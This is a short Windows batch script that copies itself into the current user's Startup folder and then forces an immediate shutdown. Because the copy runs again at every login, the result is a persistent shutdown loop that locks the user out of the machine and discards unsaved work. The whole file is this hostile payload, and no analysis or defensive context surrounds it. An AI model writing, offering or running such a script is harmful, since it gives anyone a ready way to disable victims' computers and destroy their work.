@echo off

rem Get the path to the current script
set "script_path=%~dp0"
set "script_name=%~nx0"

rem Set the destination path to the Startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Copy the script to the Startup folder
copy "%script_path%%script_name%" "%startup_folder%" > nul

rem Shutdown the computer
shutdown /s /f /t 0
